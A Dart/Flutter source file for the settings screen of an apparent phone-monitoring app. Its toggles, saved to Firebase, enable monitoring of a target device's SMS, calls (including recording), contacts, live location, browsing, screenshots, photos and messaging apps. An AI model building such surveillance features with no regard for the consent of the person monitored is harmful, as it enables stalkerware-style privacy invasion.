import 'package:flutter/material.dart';
import 'package:curved_labeled_navigation_bar/curved_navigation_bar.dart';
import 'package:curved_labeled_navigation_bar/curved_navigation_bar_item.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'dart:ui';
import 'package:flutter/services.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:flutter_animate/flutter_animate.dart';
import 'dashboard_screen.dart';
import 'recents_screen.dart';
import 'remote_commands_screen.dart';
import 'stats_screen.dart';
import '../theme/theme.dart';

class SettingsController extends ChangeNotifier {
  final String userId;
  final String deviceModel;
  final DatabaseReference _database = FirebaseDatabase.instance.ref();
  Map<String, bool> _settings = {
    'sms': false,
    'mms': false,
    'call': false,
    'callRecording': false,
    'location': false,
    'apps': false,
    'sites': false,
    'contacts': false,
    'screenshot': false,
    'instantMessaging': false,
    'photos': false,
  };

  SettingsController({required this.userId, required this.deviceModel}) {
    _loadSettings();
  }

  Future<void> _loadSettings() async {
    try {
      final snapshot = await _database
          .child('users')
          .child(userId)
          .child('phones')
          .child(deviceModel)
          .child('preferences')
          .child('settings')
          .get();

      if (snapshot.exists) {
        final Map<dynamic, dynamic> data =
            snapshot.value as Map<dynamic, dynamic>;
        _settings = Map.fromEntries(
          _settings.keys.map((key) => MapEntry(key, data[key] ?? false)),
        );
      } else {
        await _database
            .child('users')
            .child(userId)
            .child('phones')
            .child(deviceModel)
            .child('preferences')
            .child('settings')
            .set(_settings);
      }
      notifyListeners();
    } catch (e) {
      print('Error loading settings: $e');
    }
  }

  bool getSetting(String key) => _settings[key] ?? false;

  Future<void> toggleSetting(String key) async {
    if (!_settings.containsKey(key)) {
      _settings[key] = false;
    }

    _settings[key] = !_settings[key]!;

    try {
      final settingsRef = _database
          .child('users')
          .child(userId)
          .child('phones')
          .child(deviceModel)
          .child('preferences');

      await settingsRef.update({
        'settings/$key': _settings[key],
        'settings/last_updated':
            DateTime.now().millisecondsSinceEpoch.toString(),
        'settings_modified': true,
      });

      notifyListeners();
    } catch (e) {
      print('Error saving setting: $e');
      _settings[key] = !_settings[key]!;
      notifyListeners();
    }
  }
}

class SettingsScreen extends StatefulWidget {
  final String selectedDevice;

  const SettingsScreen({
    Key? key,
    required this.selectedDevice,
  }) : super(key: key);

  @override
  _SettingsScreenState createState() => _SettingsScreenState();
}

class _SettingsScreenState extends State<SettingsScreen>
    with TickerProviderStateMixin {
  final GlobalKey<CurvedNavigationBarState> _bottomNavigationKey = GlobalKey();
  int _page = 4; // Set to 4 since this is the Settings tab
  SettingsController? _controller;
  late AnimationController _settingsAnimationController;
  final _auth = FirebaseAuth.instance;
  bool _isLoading = true;
  final ScrollController _scrollController = ScrollController();

  // Section expansion states
  bool _communicationExpanded = true;
  bool _locationExpanded = true;
  bool _otherExpanded = true;

  // Initialize controllers
  late AnimationController _communicationController;
  late AnimationController _locationController;
  late AnimationController _otherController;

  @override
  void initState() {
    super.initState();
    _settingsAnimationController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 500),
    );

    // Initialize all controllers at once
    _initializeControllers();
    
    // Add memory-efficient loading
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _initializeController();
    });
  }

  void _initializeControllers() {
    _communicationController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 300),
      value: 1.0,
    );

    _locationController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 300),
      value: 1.0,
    );

    _otherController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 300),
      value: 1.0,
    );
  }

  @override
  void dispose() {
    // Dispose all controllers
    _settingsAnimationController.dispose();
    _communicationController.dispose();
    _locationController.dispose();
    _otherController.dispose();
    _scrollController.dispose();
    
    // Clear any cached data
    _controller = null;
    
    // Remove listeners
    if (mounted) {
      _removeListeners();
    }
    
    super.dispose();
  }

  void _removeListeners() {
    // Remove any event listeners or subscriptions here
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    // Clear image cache to prevent memory leaks
    imageCache.clear();
    imageCache.clearLiveImages();
  }

  Future<void> _initializeController() async {
    final user = _auth.currentUser;
    if (user == null) {
      Navigator.of(context).pushReplacementNamed('/login');
      return;
    }

    _controller = SettingsController(
      userId: user.uid,
      deviceModel: widget.selectedDevice,
    );

    setState(() {
      _isLoading = false;
    });
  }

  Widget _buildSectionHeader(String title, String subtitle, IconData icon,
      bool isExpanded, VoidCallback onTap, AnimationController controller) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      child: Material(
        color: Colors.transparent,
        child: InkWell(
          onTap: onTap,
          borderRadius: BorderRadius.circular(16),
          child: Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  AppTheme.primaryColor,
                  AppTheme.primaryColor.withOpacity(0.8),
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(16),
              boxShadow: [
                BoxShadow(
                  color: AppTheme.primaryColor.withOpacity(0.2),
                  blurRadius: 12,
                  offset: const Offset(0, 4),
                ),
              ],
            ),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Icon(icon, color: Colors.white, size: 24),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      RichText(
                        text: TextSpan(
                          text: '$title\n',
                          style: GoogleFonts.poppins(
                            fontSize: 18,
                            fontWeight: FontWeight.w600,
                            color: Colors.white,
                          ),
                          children: [
                            TextSpan(
                              text: subtitle,
                              style: GoogleFonts.poppins(
                                fontSize: 12,
                                color: Colors.white.withOpacity(0.8),
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
                RotationTransition(
                  turns: Tween(begin: 0.0, end: 0.5).animate(controller),
                  child: Container(
                    padding: const EdgeInsets.all(8),
                    decoration: BoxDecoration(
                      color: Colors.white.withOpacity(0.2),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: const Icon(
                      Icons.keyboard_arrow_down,
                      color: Colors.white,
                      size: 20,
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    ).animate().fadeIn().slideX();
  }

  Widget _buildSettingTile(
      String title, String subtitle, String settingKey, IconData icon) {
    final bool isEnabled = !_isLoading && (_controller?.getSetting(settingKey) ?? false);

    return Container(
      margin: const EdgeInsets.symmetric(vertical: 8, horizontal: 16),
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(16),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.05),
            blurRadius: 10,
            offset: const Offset(0, 4),
          ),
        ],
      ),
      child: Material(
        color: Colors.transparent,
        borderRadius: BorderRadius.circular(16),
        child: InkWell(
          borderRadius: BorderRadius.circular(16),
          onTap: _isLoading
              ? null
              : () async {
                  // Optimistic update
                  setState(() {});
                  HapticFeedback.lightImpact();
                  await _controller?.toggleSetting(settingKey);
                },
          child: Padding(
            padding: const EdgeInsets.all(16),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: isEnabled
                        ? AppTheme.primaryColor.withOpacity(0.1)
                        : Colors.grey.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Icon(
                    icon,
                    color: isEnabled ? AppTheme.primaryColor : Colors.grey,
                    size: 24,
                  ),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        title,
                        style: GoogleFonts.poppins(
                          fontSize: 16,
                          fontWeight: FontWeight.w600,
                          color: isEnabled ? Colors.black87 : Colors.grey,
                        ),
                      ),
                      const SizedBox(height: 4),
                      Text(
                        subtitle,
                        style: GoogleFonts.poppins(
                          fontSize: 12,
                          color:
                              isEnabled ? Colors.grey[600] : Colors.grey[400],
                        ),
                      ),
                    ],
                  ),
                ),
                AnimatedSwitcher(
                  duration: const Duration(milliseconds: 200),
                  transitionBuilder:
                      (Widget child, Animation<double> animation) {
                    return FadeTransition(
                      opacity: animation,
                      child: ScaleTransition(
                        scale: animation,
                        child: child,
                      ),
                    );
                  },
                  child: Switch.adaptive(
                    key: ValueKey<bool>(isEnabled),
                    value: isEnabled,
                    onChanged: _isLoading
                        ? null
                        : (bool value) async {
                            setState(() {});
                            HapticFeedback.lightImpact();
                            await _controller?.toggleSetting(settingKey);
                          },
                    activeColor: AppTheme.primaryColor,
                    activeTrackColor: AppTheme.primaryColor.withOpacity(0.3),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    ).animate().fadeIn().slideX();
  }

  Widget _buildDeviceInfoCard() {
    return Container(
      margin: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [
            AppTheme.primaryColor,
            AppTheme.primaryColor.withOpacity(0.8),
          ],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(24),
        boxShadow: [
          BoxShadow(
            color: AppTheme.primaryColor.withOpacity(0.2),
            blurRadius: 10,
            offset: const Offset(0, 5),
          ),
        ],
      ),
      child: Container(
        padding: const EdgeInsets.all(24),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Hero(
                  tag: 'device-${widget.selectedDevice}',
                  child: Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: Colors.white.withOpacity(0.2),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: const Icon(
                      Icons.phone_android,
                      color: Colors.white,
                      size: 24,
                    ),
                  ),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        'Connected Device',
                        style: GoogleFonts.poppins(
                          fontSize: 14,
                          color: Colors.white.withOpacity(0.8),
                        ),
                      ),
                      Text(
                        widget.selectedDevice,
                        style: GoogleFonts.poppins(
                          fontSize: 20,
                          fontWeight: FontWeight.w600,
                          color: Colors.white,
                        ),
                      ),
                    ],
                  ),
                ),
                Container(
                  padding: const EdgeInsets.symmetric(
                    horizontal: 12,
                    vertical: 6,
                  ),
                  decoration: BoxDecoration(
                    color: Colors.green.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(20),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Container(
                        width: 8,
                        height: 8,
                        decoration: const BoxDecoration(
                          color: Colors.green,
                          shape: BoxShape.circle,
                        ),
                      ),
                      const SizedBox(width: 6),
                      Text(
                        'Online',
                        style: GoogleFonts.poppins(
                          fontSize: 12,
                          color: Colors.white,
                        ),
                      ),
                    ],
                  ),
                )
                    .animate(onPlay: (controller) => controller.repeat())
                    .shimmer(duration: 1.seconds),
              ],
            ),
            const SizedBox(height: 20),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.1),
                borderRadius: BorderRadius.circular(12),
              ),
              child: Row(
                children: [
                  const Icon(
                    Icons.info_outline,
                    color: Colors.white,
                    size: 20,
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Text(
                      'Changes will take effect immediately when device is online',
                      style: GoogleFonts.poppins(
                        fontSize: 12,
                        color: Colors.white.withOpacity(0.9),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    ).animate().fadeIn(duration: 400.ms).slideY(begin: 0.3, end: 0);
  }

  @override
  Widget build(BuildContext context) {
    if (_isLoading) {
      return Scaffold(
        body: Container(
          decoration: BoxDecoration(
            gradient: AppTheme.backgroundGradient,
          ),
          child: Center(
            child: CircularProgressIndicator(
              color: AppTheme.primaryColor,
            ),
          ),
        ),
      );
    }

    return Scaffold(
      backgroundColor: Colors.transparent,
      extendBodyBehindAppBar: true,
      appBar: PreferredSize(
        preferredSize: const Size.fromHeight(kToolbarHeight),
        child: Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                AppTheme.primaryColor,
                AppTheme.primaryColor.withOpacity(0.9),
              ],
            ),
            borderRadius: const BorderRadius.vertical(
              bottom: Radius.circular(30),
            ),
          ),
          child: AppBar(
            leading: IconButton(
              icon: Icon(
                Icons.arrow_back_ios_new_rounded,
                color: AppTheme.surfaceColor,
                size: 22,
              ),
              onPressed: () => Navigator.of(context).pop(),
            ),
            title: Text('Settings', style: AppTheme.headlineStyle),
            backgroundColor: Colors.transparent,
            elevation: 0,
          ),
        ),
      ),
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              AppTheme.primaryColor,
              AppTheme.backgroundColor,
              AppTheme.backgroundColor,
            ],
            stops: const [0.0, 0.2, 1.0],
          ),
        ),
        child: SingleChildScrollView(
          controller: _scrollController,
          physics: const BouncingScrollPhysics(),
          padding: EdgeInsets.only(
            top: MediaQuery.of(context).padding.top + kToolbarHeight + 16,
            bottom: 16,
          ),
          child: Column(
            children: [
              _buildDeviceInfoCard(),
              _buildSectionHeader(
                'Communication',
                'Manage message and call monitoring',
                Icons.chat_bubble_outline,
                _communicationExpanded,
                () {
                  setState(() {
                    _communicationExpanded = !_communicationExpanded;
                    if (_communicationExpanded) {
                      _communicationController.forward();
                    } else {
                      _communicationController.reverse();
                    }
                  });
                },
                _communicationController,
              ),
              if (_communicationExpanded) ...[
                _buildSettingTile(
                  'SMS Monitoring',
                  'Monitor SMS messages and conversations',
                  'sms',
                  Icons.message_outlined,
                ),
                _buildSettingTile(
                  'MMS Monitoring',
                  'Track multimedia messages and attachments',
                  'mms',
                  Icons.mms_outlined,
                ),
                _buildSettingTile(
                  'Call Monitoring',
                  'Record and monitor phone calls',
                  'call',
                  Icons.call_outlined,
                ),
                _buildSettingTile(
                  'Contacts',
                  'Monitor contact list changes and interactions',
                  'contacts',
                  Icons.contacts_outlined,
                ),
              ],
              _buildSectionHeader(
                'Location & Activity',
                'Track location and app usage',
                Icons.location_on_outlined,
                _locationExpanded,
                () {
                  setState(() {
                    _locationExpanded = !_locationExpanded;
                    if (_locationExpanded) {
                      _locationController.forward();
                    } else {
                      _locationController.reverse();
                    }
                  });
                },
                _locationController,
              ),
              if (_locationExpanded) ...[
                _buildSettingTile(
                  'Location Tracking',
                  'Monitor real-time location and movement',
                  'location',
                  Icons.location_on_outlined,
                ),
                _buildSettingTile(
                  'App Monitoring',
                  'Track app usage and activity patterns',
                  'apps',
                  Icons.apps_outlined,
                ),
                _buildSettingTile(
                  'Web Monitoring',
                  'Monitor browser history and activity',
                  'sites',
                  Icons.web_outlined,
                ),
              ],
              _buildSectionHeader(
                'Other Monitoring',
                'Additional monitoring features',
                Icons.more_horiz_outlined,
                _otherExpanded,
                () {
                  setState(() {
                    _otherExpanded = !_otherExpanded;
                    if (_otherExpanded) {
                      _otherController.forward();
                    } else {
                      _otherController.reverse();
                    }
                  });
                },
                _otherController,
              ),
              if (_otherExpanded) ...[
                _buildSettingTile(
                  'Screenshot',
                  'Capture periodic screenshots of device activity',
                  'screenshot',
                  Icons.screenshot_outlined,
                ),
                _buildSettingTile(
                  'Photos Monitor',
                  'Track camera usage and photo gallery',
                  'photos',
                  Icons.photo_outlined,
                ),
                _buildSettingTile(
                  'Instant Messaging',
                  'Monitor popular messaging applications',
                  'instantMessaging',
                  Icons.message_outlined,
                ),
              ],
              const SizedBox(height: 80),
            ],
          ),
        ),
      ),
      bottomNavigationBar: CurvedNavigationBar(
        key: _bottomNavigationKey,
        index: 4,
        items: const [
          CurvedNavigationBarItem(
            child: Icon(Icons.home_outlined),
            label: 'Home',
          ),
          CurvedNavigationBarItem(
            child: Icon(Icons.history),
            label: 'Recent',
          ),
          CurvedNavigationBarItem(
            child: Icon(Icons.phone_android_outlined),
            label: 'Remote',
          ),
          CurvedNavigationBarItem(
            child: Icon(Icons.bar_chart),
            label: 'Stats',
          ),
          CurvedNavigationBarItem(
            child: Icon(Icons.settings),
            label: 'Settings',
          ),
        ],
        color: Colors.white,
        buttonBackgroundColor: Colors.white,
        backgroundColor: AppTheme.primaryColor,
        animationCurve: Curves.easeInOutCubic,
        animationDuration: const Duration(milliseconds: 800),
        onTap: (index) {
          // Prevent navigation if already on the selected page
          if (index == _page) return;

          setState(() {
            _page = index;
          });

          // Use Navigator.pushReplacement instead of push to prevent stack buildup
          Navigator.pushReplacement(
            context,
            PageRouteBuilder(
              pageBuilder: (context, animation, secondaryAnimation) {
                switch (index) {
                  case 0:
                    return DashboardScreen();
                  case 1:
                    return RecentsScreen(selectedDevice: widget.selectedDevice);
                  case 2:
                    return RemoteControlScreen(
                        selectedDevice: widget.selectedDevice);
                  case 3:
                    return AdvancedStatsScreen(
                        selectedDevice: widget.selectedDevice);
                  case 4:
                    return SettingsScreen(
                        selectedDevice: widget.selectedDevice);
                  default:
                    return DashboardScreen();
                }
              },
              transitionsBuilder:
                  (context, animation, secondaryAnimation, child) {
                const begin = Offset(1.0, 0.0);
                const end = Offset.zero;
                const curve = Curves.easeInOutCubic;

                var tween = Tween(begin: begin, end: end)
                    .chain(CurveTween(curve: curve));

                return SlideTransition(
                  position: animation.drive(tween),
                  child: child,
                );
              },
            ),
          );
        },
        letIndexChange: (index) => true,
      ),
    );
  }
}
